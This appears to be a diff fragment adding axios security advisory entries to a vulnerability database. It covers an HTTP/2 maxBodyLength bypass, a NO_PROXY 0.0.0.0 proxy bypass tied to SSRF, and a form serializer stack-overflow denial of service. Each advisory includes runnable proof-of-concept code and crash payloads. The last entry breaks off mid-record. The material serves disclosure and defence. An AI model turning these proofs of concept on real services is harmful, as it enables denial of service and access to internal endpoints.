+                details: "## Summary\n\nAxios versions with Node.js HTTP/2 support allow streamed request bodies to bypass `maxBodyLength` enforcement when requests are sent with `httpVersion: 2`.\n\nThis affects applications that rely on `maxBodyLength` as a hard cap while forwarding attacker-controlled streams, such as upload endpoints proxying user data to an upstream HTTP/2 service. Buffered request bodies are still checked before the request is sent.\n\n## Impact\n\nAn attacker who can control a stream passed to axios can cause the application to transmit more outbound data than the configured `maxBodyLength` limit.\n\nPractical impact is limited to resource consumption and policy bypass: excess outbound bandwidth, egress cost, upstream quota consumption, and limited availability impact on the application or upstream peer. This does not provide code execution, credential disclosure, or request destination control.\n\nBrowser adapters are not affected. Axios calls using the default unlimited `maxBodyLength: -1` do not cross this specific configured-limit boundary.\n\n## Affected Functionality\n\nAffected calls require all of the following:\n\n- Node.js HTTP adapter.\n- `httpVersion: 2`.\n- Request `data` supplied as a stream.\n- A finite `maxBodyLength`.\n- Attacker-controlled or attacker-influenced stream contents.\n\nUnaffected or differently affected paths:\n\n- String, Buffer, and ArrayBuffer request bodies are checked before transport selection.\n- Browser XHR/fetch adapters are not affected.\n- HTTP/1.1 requests using `follow-redirects` enforce `options.maxBodyLength`.\n- In `axios >=1.15.1`, setting `maxRedirects: 0` on affected HTTP/2 upload calls activates axios\u2019 existing stream wrapper and rejects oversized streams.\n\n## Technical Details\n\nIn `lib/adapters/http.js`, axios selects `http2Transport` whenever `httpVersion` resolves to `2`. The adapter still stores `config.maxBodyLength` on `options.maxBodyLength`, but Node\u2019s HTTP/2 request API does not enforce that option.\n\nThe stream-level byte-counting wrapper is currently gated on `config.maxBodyLength > -1 && config.maxRedirects === 0`. For HTTP/2 requests using the default redirect setting, axios does not use `follow-redirects` and also does not enter this wrapper, so `uploadStream.pipe(req)` sends the full stream.\n\nLocal verification against the current `v1.x` checkout showed a request with `maxBodyLength: 1024` successfully transmitting `2097152` bytes over HTTP/2.\n\nNo fixed release exists yet. The fix should enforce the byte-counting stream wrapper for HTTP/2 streamed uploads, not only for the native HTTP/1.1 `maxRedirects: 0` path.\n\n## Proof of Concept of Attack\n\n```js\nimport http2 from 'node:http2';\nimport {Readable} from 'node:stream';\nimport axios from './index.js';\n\nconst LIMIT = 1024;\nconst PAYLOAD_BYTES = 2 * 1024 * 1024;\n\nconst server = http2.createServer();\n\nserver.on('stream', (stream) => {\n  let received = 0;\n\n  stream.on('data', (chunk) => {\n    received += chunk.length;\n  });\n\n  stream.on('end', () => {\n    stream.respond({':status': 200, 'content-type': 'application/json'});\n    stream.end(JSON.stringify({received, limit: LIMIT}));\n  });\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n\nfunction makeBody(total) {\n  const chunk = Buffer.alloc(64 * 1024, 0x41);\n  let remaining = total;\n\n  return new Readable({\n    read() {\n      if (remaining <= 0) {\n        this.push(null);\n        return;\n      }\n\n      const next = remaining >= chunk.length ? chunk : chunk.subarray(0, remaining);\n      remaining -= next.length;\n      this.push(next);\n    }\n  });\n}\n\ntry {\n  const response = await axios.post(\n    `http://127.0.0.1:${server.address().port}/upload`,\n    makeBody(PAYLOAD_BYTES),\n    {\n      httpVersion: 2,\n      maxBodyLength: LIMIT,\n      headers: {'content-type': 'application/octet-stream'}\n    }\n  );\n\n  console.log(response.data);\n  // Vulnerable result: { received: 2097152, limit: 1024 }\n} finally {\n  server.close();\n}\n```\n\n## Workarounds\n\nFor `axios >=1.15.1`, set `maxRedirects: 0` on affected HTTP/2 streamed upload calls. HTTP/2 redirects are not currently supported by the axios HTTP/2 adapter, so this is a practical per-call mitigation for this path.\n\nFor earlier affected versions, pre-limit the stream with a byte-counting transform before passing it to axios, reject oversized uploads before forwarding them, or avoid `httpVersion: 2` for untrusted streamed uploads.### Summary\nOn Node.js, axios's maxBodyLength is documented as a hard cap on outbound request bodies. For streamed uploads sent over httpVersion: 2, axios never enforces this cap: the entire body is transmitted regardless of size. Severity: medium.\n\n<details>\n<summary>Original Report</summary>\n### Details\nIn lib/adapters/http.js, transport selection is unconditional for HTTP/2:\n\nhttp.js Lines 937-956\n```\n      if (isHttp2) {\n        transport = http2Transport;\n      } else {\n        const configTransport = own('transport');\n        if (configTransport) {\n          transport = configTransport;\n        } else if (config.maxRedirects === 0) {\n          transport = isHttpsRequest ? https : http;\n          isNativeTransport = true;\n        } else {\n          if (config.maxRedirects) {\n            options.maxRedirects = config.maxRedirects;\n          }\n          const configBeforeRedirect = own('beforeRedirect');\n          if (configBeforeRedirect) {\n            options.beforeRedirects.config = configBeforeRedirect;\n          }\n          transport = isHttpsRequest ? httpsFollow : httpFollow;\n        }\n      }\n```\n\nmaxBodyLength is then stored on the request options:\n\nhttp.js Lines 958-963\n```\n      if (config.maxBodyLength > -1) {\n        options.maxBodyLength = config.maxBodyLength;\n      } else {\n        // follow-redirects does not skip comparison, so it should always succeed for axios -1 unlimited\n        options.maxBodyLength = Infinity;\n      }\n```\n\u2026but options.maxBodyLength is only honored by the follow-redirects transport. Node's native http2.request does not read it. The only stream-level cap in this file is the byte-counting Transform wrapper for streamed uploads, which is gated on config.maxRedirects === 0:\n\nhttp.js Lines 1270-1304\n```\n        // Enforce maxBodyLength for streamed uploads on the native http/https\n        // transport (maxRedirects === 0); follow-redirects enforces it on the\n        // other path.\n        let uploadStream = data;\n        if (config.maxBodyLength > -1 && config.maxRedirects === 0) {\n          const limit = config.maxBodyLength;\n          let bytesSent = 0;\n          uploadStream = stream.pipeline(\n            [\n              data,\n              new stream.Transform({\n                transform(chunk, _enc, cb) {\n                  bytesSent += chunk.length;\n                  if (bytesSent > limit) {\n                    return cb(\n                      new AxiosError(\n                        'Request body larger than maxBodyLength limit',\n                        AxiosError.ERR_BAD_REQUEST,\n                        config,\n                        req\n                      )\n                    );\n                  }\n                  cb(null, chunk);\n                },\n              }),\n            ],\n            utils.noop\n          );\n          uploadStream.on('error', (err) => {\n            if (!req.destroyed) req.destroy(err);\n          });\n        }\n        uploadStream.pipe(req);\n```\n\nFor the HTTP/2 path, neither branch fires: the http2Transport is always selected, and follow-redirects is never used. The byte-counting transform also doesn't fire unless the caller happens to pin maxRedirects: 0. As a result, uploadStream.pipe(req) streams the full body into the HTTP/2 request unbounded.\n\n### PoC\n```\nimport http2 from 'node:http2';\nimport { Readable } from 'node:stream';\nimport axios from '../../index.js';\n\nconst LIMIT = 1024;\nconst PAYLOAD_BYTES = 2 * 1024 * 1024;\n\n// Cleartext HTTP/2 (h2c) server. http2.connect() supports h2c when given an\n// `http://...` authority, which mirrors what axios does when the request URL\n// uses `http://` and `httpVersion: 2`.\nconst server = http2.createServer();\n\nserver.on('stream', (stream, _headers) => {\n  let received = 0;\n  stream.on('data', (chunk) => {\n    received += chunk.length;\n  });\n  stream.on('end', () => {\n    stream.respond({\n      ':status': 200,\n      'content-type': 'application/json',\n    });\n    stream.end(JSON.stringify({ received, limit: LIMIT }));\n  });\n  stream.on('error', () => {\n    /* swallow client-side aborts */\n  });\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\nfunction makeBodyStream(totalBytes) {\n  const CHUNK = Buffer.alloc(64 * 1024, 0x41);\n  let remaining = totalBytes;\n  return new Readable({\n    read() {\n      if (remaining <= 0) {\n        this.push(null);\n        return;\n      }\n      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);\n      remaining -= next.length;\n      this.push(next);\n    },\n  });\n}\n\ntry {\n  let result;\n  try {\n    const response = await axios.post(`http://127.0.0.1:${port}/upload`, makeBodyStream(PAYLOAD_BYTES), {\n      httpVersion: 2,\n      maxBodyLength: LIMIT,\n      // We intentionally do NOT set maxRedirects: 0 \u2014 that flag activates the\n      // existing HTTP/1 byte-counting wrapper. The bug under test is that the\n      // HTTP/2 transport path skips that wrapper entirely.\n      headers: { 'content-type': 'application/octet-stream' },\n      // Omit content-length so the body is streamed without a known length.\n    });\n    result = { status: response.status, data: response.data };\n  } catch (err) {\n    result = { error: err && (err.code || err.message) };\n  }\n\n  console.log('--- PoC: HTTP/2 maxBodyLength bypass ---');\n  console.log('axios result:', JSON.stringify(result));\n\n  const ok =\n    result &&\n    result.status === 200 &&\n    result.data &&\n    typeof result.data === 'object' &&\n    result.data.received === PAYLOAD_BYTES &&\n    result.data.limit === LIMIT;\n\n  if (ok) {\n    console.log(\n      `VULNERABLE: server received ${result.data.received} bytes despite ` +\n        `maxBodyLength=${LIMIT}.`\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: axios refused or truncated the oversized stream.');\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // http2 sessions cached by axios may keep the event loop alive; force exit\n  // after the assertion so the script returns instead of idling on TCP keep-alive.\n  setImmediate(() => process.exit(process.exitCode || 0));\n}\n```\n\n### Impact\n- Uncontrolled outbound egress: an attacker who controls the upstream stream (e.g. via an upload endpoint that pipes into axios) can force the application to transmit arbitrarily large payloads.\n- Bypass of cost/quota guards configured via maxBodyLength against billed upstream services.\n- Resource exhaustion against upstream peers, proxies, and the application's own connection / memory budget.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.15.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-183",
+                  "CWE-918"
+                ],
+                identifiers: {
+                  summary: "Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios",
+                  githubID: "GHSA-f4gw-2p7v-4548",
+                  CVE: [
+                    "CVE-2026-67315"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions containing `lib/helpers/shouldBypassProxy.js` do not treat `0.0.0.0` as a local address when evaluating `NO_PROXY` rules. In Node.js applications that use `HTTP_PROXY` or `HTTPS_PROXY` together with `NO_PROXY=localhost,127.0.0.1,::1` or similar, a request to `http://0.0.0.0:<port>/` can be routed through the configured proxy instead of bypassing it.\n\nThe issue is exploitable when an attacker can influence the axios request URL or a followed redirect target, and when the proxy can reach or relay `0.0.0.0` to local services. This is a Node.js runtime proxy-routing issue, not a browser, install-time, or development-tooling issue.\n\n## Impact\n\nApplications are affected when all of the following are true:\n\n- The application runs axios in Node.js with the HTTP adapter.\n- The process uses environment proxy variables such as `HTTP_PROXY` or `HTTPS_PROXY`.\n- The process uses `NO_PROXY` entries such as `localhost`, `127.0.0.1`, or `::1` to keep local traffic out of the proxy path.\n- Attacker-controlled input can influence the request URL or redirect target.\n- The configured proxy does not reject `0.0.0.0` and can reach the local destination.\n\nFor plain HTTP targets, the proxy can receive the full request URL, headers, and body, and may be able to observe the local service response. HTTPS targets are less exposed because axios uses CONNECT tunneling in current versions.\n\n## Affected Functionality\n\nAffected functionality is limited to environment-derived proxy selection in the Node HTTP adapter:\n\n- `lib/adapters/http.js` calls `getProxyForUrl(location)` and then `shouldBypassProxy(location)` before applying the proxy.\n- `lib/helpers/shouldBypassProxy.js` normalizes and compares `NO_PROXY` entries.\n- Explicit caller-provided `config.proxy` remains trusted caller configuration.\n- Browser, React Native, XHR, and fetch adapter behavior are not affected.\n\n## Technical Details\n\n`lib/helpers/shouldBypassProxy.js` defines local loopback equivalence through `isLoopback()`. The current implementation recognizes `localhost`, IPv4 `127.0.0.0/8`, IPv6 `::1`, and IPv4-mapped loopback forms, but it does not include `0.0.0.0`.\n\nAt `lib/helpers/shouldBypassProxy.js:176`, axios treats two hosts as matching when both are considered loopback:\n\n```js\nreturn hostname === entryHost || (isLoopback(hostname) && isLoopback(entryHost));\n```\n\nBecause `isLoopback('0.0.0.0')` returns `false`, `NO_PROXY=localhost,127.0.0.1,::1` does not match `http://0.0.0.0:<port>/`. `lib/adapters/http.js:185-193` then applies the environment proxy.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from './index.js';\n\nconst listen = (handler, host = '127.0.0.1') =>\n  new Promise((resolve) => {\n    const server = http.createServer(handler);\n    server.listen(0, host, () => resolve(server));\n  });\n\nconst close = (server) => new Promise((resolve) => server.close(resolve));\n\nconst origin = await listen((req, res) => res.end('origin'), '0.0.0.0');\n\nlet proxyRequests = 0;\nconst proxy = await listen((req, res) => {\n  proxyRequests += 1;\n  res.end('proxied');\n});\n\nprocess.env.http_proxy = `http://127.0.0.1:${proxy.address().port}`;\nprocess.env.HTTP_PROXY = process.env.http_proxy;\nprocess.env.no_proxy = 'localhost,127.0.0.1,::1';\nprocess.env.NO_PROXY = process.env.no_proxy;\n\ntry {\n  const direct = await axios.get(`http://127.0.0.1:${origin.address().port}/`);\n  const zero = await axios.get(`http://0.0.0.0:${origin.address().port}/`);\n\n  console.log({ direct: direct.data, zero: zero.data, proxyRequests });\n} finally {\n  await close(origin);\n  await close(proxy);\n}\n```\n\nExpected safe behavior: both `127.0.0.1` and `0.0.0.0` bypass the proxy when the `NO_PROXY` policy is intended to cover local destinations.\n\nObserved behavior: `127.0.0.1` bypasses the proxy, while `0.0.0.0` is sent through the proxy.\n\n## Workarounds\n\n- Add `0.0.0.0` explicitly to `NO_PROXY` where local addresses must bypass proxies.\n- Reject or normalize `0.0.0.0` in application URL validation before calling axios.\n- Set `proxy: false` on axios requests that must never use environment proxies.\n- Configure the proxy itself to reject `0.0.0.0`, loopback, link-local, and internal address ranges.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n`axios` versions 1.15.0\u20131.16.1 contain an incomplete loopback-address check in `lib/helpers/shouldBypassProxy.js`. The `isLoopback()` function correctly identifies `127.0.0.0/8` and `::1` as loopback addresses but does not recognise `0.0.0.0` \u2014 the IPv4 unspecified address, which routes to the local machine on Linux and macOS.\n\nAn attacker who controls a URL passed to axios can use `http://0.0.0.0/<path>` to bypass proxy-based SSRF filtering that the application relies upon.\n\n### Details\n## Affected versions\n\n`>= 1.15.0, <= 1.16.1`\n\nThe vulnerability was introduced in v1.15.0 when the `shouldBypassProxy` helper was added as a security improvement (PR #10661).\n\n---\n\n## Root cause\n\n**File:** `lib/helpers/shouldBypassProxy.js`\n\n```javascript\n// Line 1 \u2014 static allowlist (incomplete)\nconst LOOPBACK_HOSTNAMES = new Set(['localhost']);   // \u2190 0.0.0.0 missing\n\nconst isIPv4Loopback = (host) => {\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;   // \u2190 0.0.0.0: parts[0] = '0' \u2192 false\n  return parts.every((p) => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n};\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;   // \u2190 '0.0.0.0' not in set\n  if (isIPv4Loopback(host)) return true;           // \u2190 returns false for 0.0.0.0\n  return isIPv6Loopback(host);\n};\n\nisLoopback('0.0.0.0') returns false.\n\nNode's WHATWG URL parser does not normalise 0.0.0.0 to 127.0.0.1. Other bypass forms are safe: new URL('http://0177.0.0.1/').hostname \u2192 '127.0.0.1' (octal), new URL('http://2130706433/').hostname \u2192 '127.0.0.1' (decimal), new URL('http://0x7f000001/').hostname \u2192 '127.0.0.1' (hex). Only 0.0.0.0 escapes normalisation.\n\n\n### PoC\n'use strict';\n\n// Verbatim copy of relevant logic from axios v1.16.1 shouldBypassProxy.js\n\nconst LOOPBACK_HOSTNAMES = new Set(['localhost']);\n\nconst isIPv4Loopback = (host) => {\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;\n  return parts.every((p) => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n};\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;\n  return isIPv4Loopback(host);\n};\n\n// 1. Show URL parser does NOT normalise 0.0.0.0\nconsole.log(new URL('http://0.0.0.0/').hostname);    // \u2192 '0.0.0.0'   \u2190 NOT normalised\nconsole.log(new URL('http://0177.0.0.1/').hostname); // \u2192 '127.0.0.1' \u2190 normalised (safe)\nconsole.log(new URL('http://2130706433/').hostname);  // \u2192 '127.0.0.1' \u2190 normalised (safe)\n\n// 2. Show isLoopback fails for 0.0.0.0\nconsole.log(isLoopback('0.0.0.0'));   // \u2192 false  \u2190 BUG: should be true\nconsole.log(isLoopback('127.0.0.1')); // \u2192 true   \u2190 correct\n\nVerified output on Node.js v22 / axios v1.16.1:\n0.0.0.0     \u2190 NOT normalised by URL parser\n127.0.0.1   \u2190 octal normalised correctly\n127.0.0.1   \u2190 decimal normalised correctly\nfalse       \u2190 0.0.0.0 not detected as loopback  \u26A0\ntrue        \u2190 127.0.0.1 correctly detected\n\n### Impact\nApplications that:\n\nAccept user-supplied URLs and pass them to axios\nUse a proxy with NO_PROXY=localhost (or similar) for SSRF filtering\n\u2026can be bypassed by supplying http://0.0.0.0/<path>. Axios routes the request through the proxy (shouldBypassProxy returns false). If the proxy itself does not filter 0.0.0.0, the connection reaches the local machine \u2014 exposing internal services such as cloud IMDS endpoints, internal admin panels, or microservice APIs.\n\nFix\nMinimal (one line):\n\n- const LOOPBACK_HOSTNAMES = new Set(['localhost']);\n+ const LOOPBACK_HOSTNAMES = new Set(['localhost', '0.0.0.0']);\n\nComprehensive:\n\nconst isIPv4Unspecified = (host) => host === '0.0.0.0';\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;\n  if (isIPv4Loopback(host)) return true;\n  if (isIPv4Unspecified(host)) return true;   // add this line\n  return isIPv6Loopback(host);\n};\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.15.1",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "Axios form serializer maxDepth bypass via {} metatoken",
+                  githubID: "GHSA-hcpx-6fm6-wx23",
+                  CVE: [
+                    "CVE-2026-67321"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions in the fixed lines for GHSA-62hf-57xw-28j9 still contain an incomplete depth-limit bypass in `lib/helpers/toFormData.js`. When serializing an object with a top-level key ending in `{}`, axios calls `JSON.stringify()` on that value before the `formSerializer.maxDepth` guard can inspect the nested structure.\n\nAn attacker who can control object keys and nested values passed by an application into axios form or parameter serialization can trigger a raw `RangeError: Maximum call stack size exceeded`, causing a denial of service in the affected request path.\n\n## Impact\n\nThe impact is availability only. No confidentiality or integrity impact was confirmed.\n\nServer-side applications are the primary concern when they accept user-controlled input and pass it into axios as `data` or `params` for `multipart/form-data`, `application/x-www-form-urlencoded`, or default parameter serialization. Browser impact is limited to the page or request context unless the application builds a broader failure mode around the thrown exception.\n\nThe attack requires control over a top-level object key ending in `{}` and a deeply nested object value. The option `formSerializer.metaTokens: false` is not a workaround because it only changes the emitted key name; the value is still stringified.\n\n## Affected Functionality\n\nAffected paths include:\n\n- `lib/helpers/toFormData.js` when a top-level key ends with `{}`.\n- `lib/helpers/toURLEncodedForm.js`, which delegates to `helpers.defaultVisitor`.\n- `lib/helpers/AxiosURLSearchParams.js`, used by default params serialization.\n- Request transforms in `lib/defaults/index.js` when object data is serialized as `multipart/form-data` or `application/x-www-form-urlencoded`.\n\nUnaffected paths include:\n\n- Already-created `FormData` or `URLSearchParams` values that axios does not walk with `toFormData`.\n- Custom `paramsSerializer.serialize` implementations that do not call axios `toFormData`.\n- Non-`{}` deeply nested values in `toFormData`, which hit `ERR_FORM_DATA_DEPTH_EXCEEDED` as intended.\n\n## Technical Details\n\nIn `lib/helpers/toFormData.js`, `defaultVisitor()` handles top-level keys ending in `{}` before recursive traversal:\n\n```js\nif (value && !path && typeof value === 'object') {\n  if (utils.endsWith(key, '{}')) {\n    key = metaTokens ? key : key.slice(0, -2);\n    value = JSON.stringify(value);\n  }\n}\n```\n\nThe depth guard is in `build()`:\n\n```js\nif (depth > maxDepth) {\n  throw new AxiosError(\n    'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n    AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n  );\n}\n```\n\nFor `{}` metatoken values, `build()` only sees the top-level property. The nested value is handed directly to native `JSON.stringify()`, which recurses internally and can throw `RangeError` before axios emits the intended `AxiosError`.\n\n## Proof of Concept of Attack\n\nSafe local PoC with no network I/O:\n\n```js\nimport toFormData from './lib/helpers/toFormData.js';\n\nfunction buildDeep(depth) {\n  const head = {};\n  let cur = head;\n\n  for (let i = 0; i < depth; i += 1) {\n    cur.x = {};\n    cur = cur.x;\n  }\n\n  return head;\n}\n\ntry {\n  toFormData({ 'evil{}': buildDeep(10000) });\n} catch (err) {\n  console.log(err.name, err.code || '', err.message);\n}\n\n// Expected affected result:\n// RangeError  Maximum call stack size exceeded\n```\n\nExpected fixed behavior is an `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`.\n\n## Workarounds\n\nReject or depth-limit untrusted objects before passing them to axios serialization.\n\nStrip or reject top-level keys ending in `{}` from untrusted objects when using axios form serialization.\n\nFor query parameters, use a custom `paramsSerializer.serialize` that enforces a depth limit.\n\nFor form bodies, construct `FormData` or `URLSearchParams` manually after validating input depth.\n\n<details>\n<summary>Original Report</summary>\n\n## Summary\nThe `maxDepth=100` guard added in axios 1.15.0 to fix GHSA-62hf-57xw-28j9 lives inside the `build()` recursion in `lib/helpers/toFormData.js`. The default visitor at `lib/helpers/toFormData.js:166-170` still has a top-level shortcut that calls `JSON.stringify(value)` whenever a key ends in `'{}'`, before `build()` ever sees the nested value. JSON.stringify on a deeply nested object stack-overflows with `RangeError: Maximum call stack size exceeded`, which propagates synchronously out of the axios call. The exact attacker-data flow that the original advisory described (proxy-style code that forwards client JSON into `axios({ data, params })`) still crashes the process at depth ~3000 on a default Node.js stack, despite v1.16.0 being patched.\n\n## Details\nAffected: axios 1.15.0 - 1.16.0 (every released version that carries the GHSA-62hf-57xw-28j9 fix). The bug is reachable from any code path that hits `toFormData`, which includes:\n\n- `axios.post(url, data, { headers: { 'content-type': 'application/x-www-form-urlencoded' } })` -> `defaults.transformRequest` -> `toURLEncodedForm(data)` -> `toFormData`\n- `axios.post(url, data, { headers: { 'content-type': 'multipart/form-data' } })` -> same path via `toFormData`\n- `axios.get(url, { params })` -> `buildURL` -> `new AxiosURLSearchParams(params)` -> `toFormData`\n\nVulnerable code, `lib/helpers/toFormData.js`:\n\n```javascript\n// 156 function defaultVisitor(value, key, path) {\n// 165 if (value && !path && typeof value === 'object') {\n// 166 if (utils.endsWith(key, '{}')) {\n// 167 // eslint-disable-next-line no-param-reassign\n// 168 key = metaTokens ? key : key.slice(0, -2);\n// 169 // eslint-disable-next-line no-param-reassign\n// 170 value = JSON.stringify(value); // <-- V8 native, NOT depth-checked\n// 171 } else if (...\n```\n\n`build()` later does enforce `maxDepth`:\n\n```javascript\n// 211 function build(value, path, depth = 0) {\n// 212 if (utils.isUndefined(value)) return;\n// 213\n// 214 if (depth > maxDepth) {\n// 215 throw new AxiosError(\n// 216 'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n// 217 AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n// 218 );\n```\n\nThe `'{}'` shortcut runs in `defaultVisitor`, which is invoked from inside `build()` for top-level keys (the `!path` clause at line 165 means the shortcut only triggers at top level, where `path` is `undefined`). At that point `depth === 0` and the maxDepth check has already passed; the recursion-aware guard never sees the nested value because `defaultVisitor` reassigns `value = JSON.stringify(value)` and returns the rendered string straight to `formData.append`. JSON.stringify itself is recursive in V8 and stack-overflows on deeply nested objects, throwing `RangeError` synchronously.\n\nThe behaviour is independent of the `metaTokens` option: line 168 only changes whether `'{}'` stays on the key name, line 170 stringifies regardless. `toURLEncodedForm`'s wrapper visitor in `lib/helpers/toURLEncodedForm.js:11-14` falls through to the same `defaultVisitor`, so the form-encoded path is also affected.\n\nThe attacker payload is a single top-level key ending in `'{}'` whose value is a nested object. The keys themselves do not have to be deep, so the payload is small to send (a few KB of `{\"x\":{\"x\":...}}` produces enough nesting to overflow). The original advisory's threat model -- a server that forwards `req.body` or `req.query` into axios -- is unchanged:\n\n```javascript\napp.post('/forward', async (req, res) => {\n await axios.post('https://upstream/api', req.body); // req.body attacker-controlled\n res.send('ok');\n});\n// attacker POST /forward with content-type: application/x-www-form-urlencoded\n// body: {\"evil{}\": <8000-deep object>}\n// -> JSON.stringify recurses inside defaultVisitor -> RangeError -> handler crashes\n```\n\nThe error is not an `AxiosError`; it is a raw `RangeError` thrown from the stringifier, so handlers that look for `err.code === 'ERR_FORM_DATA_DEPTH_EXCEEDED'` (the documented signal that the maxDepth guard fired) do not see it. Synchronous startup paths or worker threads still take the whole process down.\n\nThe fix is to also depth-limit (or pre-walk) the value before calling `JSON.stringify` on line 170, or to remove the top-level `'{}'` shortcut and rely on the depth-checked `build()` recursion to handle it. A minimal patch that preserves observable behaviour for legal payloads:\n\n```diff\n if (utils.endsWith(key, '{}')) {\n // eslint-disable-next-line no-param-reassign\n key = metaTokens ? key : key.slice(0, -2);\n+ // Reject objects that would exceed maxDepth before handing to JSON.stringify,\n+ // which is recursive in V8 and stack-overflows on deeply nested input.\n+ (function checkDepth(v, d) {\n+ if (d > maxDepth) {\n+ throw new AxiosError(\n+ 'Object is too deeply nested (' + d + ' levels). Max depth: ' + maxDepth,\n+ AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n+ );\n+ }\n+ if (v && typeof v === 'object') {\n+ for (const k in v) checkDepth(v[k], d + 1);\n+ }\n+ })(value, 0);\n // eslint-disable-next-line no-param-reassign\n value = JSON.stringify(value);\n }\n```\n\n(The recursion in `checkDepth` itself is bounded by `maxDepth`, so it cannot itself overflow.)\n\n## PoC\nReproduces against a clean clone of `axios/axios` at v1.16.0 with `npm install` already run. `targets/axios/poc_jsonstringify_dos.mjs` is the script:\n\n```javascript\nimport axios from './source/index.js';\n\nfunction buildDeep(depth) {\n let head = {};\n let cur = head;\n for (let i = 0; i < depth; i++) { cur.x = {}; cur = cur.x; }\n return head;\n}\n\nconst malicious = buildDeep(5000);\nconst safeAdapter = () => Promise.resolve({\n data: 'never reached', status: 200, statusText: 'OK', headers: {}, config: {}\n});\n\n// 1. POST x-www-form-urlencoded\ntry {\n await axios.post('http://example.test/x',\n { 'evil{}': malicious },\n { headers: { 'content-type': 'application/x-www-form-urlencoded' }, adapter: safeAdapter });\n} catch (e) {\n console.log('POST form-encoded:', e.name, '-', e.message);\n}\n\n// 2. GET with params\ntry {\n await axios.get('http://example.test/x',\n { params: { 'evil{}': malicious }, adapter: safeAdapter });\n} catch (e) {\n console.log('GET params:', e.name, '-', e.message);\n}\n```\n\n3/3 runs reproduce the same `RangeError` on `axios@1.16.0` with Node.js 24:\n\n```\n$ node poc_jsonstringify_dos.mjs\nPOST form-encoded: RangeError - Maximum call stack size exceeded\nGET params: RangeError - Maximum call stack size exceeded\n```\n\n`safeAdapter` is a stub that returns a fake response, so the crash is provably inside axios's serialization layer, not in HTTP I/O. Removing the `'{}'` suffix from the key and re-running gives the expected `AxiosError: Object is too deeply nested ... ERR_FORM_DATA_DEPTH_EXCEEDED` from the maxDepth guard, confirming the fix is wired correctly elsewhere -- it just does not cover this branch.\n\nCrash threshold on a default-stack Node.js process is roughly depth 2500-3000; 8000 is comfortably above that, and the payload is a few KB.\n\n## Impact\nA remote, unauthenticated attacker who can influence an object that the application passes to axios as request `data` or `params` triggers an uncaught `RangeError` from inside the synchronous `JSON.stringify` call in `defaultVisitor`. In server-side applications that proxy or re-forward client JSON through axios -- the same threat model that motivated GHSA-62hf-57xw-28j9 -- this crashes the request handler and, in worker/cluster setups, the whole process. The previously shipped `maxDepth` guard does not stop it because the `'{}'` suffix path bypasses `build()` entirely. Same severity class as the original advisory (CWE-674 Uncontrolled Recursion, network-reachable DoS); the only difference is the attacker has to suffix one of their object keys with `'{}'` to land on the unguarded code path.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-hcpx-6fm6-wx23",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.15.2",
+                below: "1.18.0",
+                severity: "high",
+                cwe: [
+                  "CWE-1321",
+                  "CWE-200"
+                ],
+                identifiers: {
+                  summary: "Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning",
+                  githubID: "GHSA-gcfj-64vw-6mp9",
+                  CVE: [
+                    "CVE-2026-67320"
+                  ]
+                },
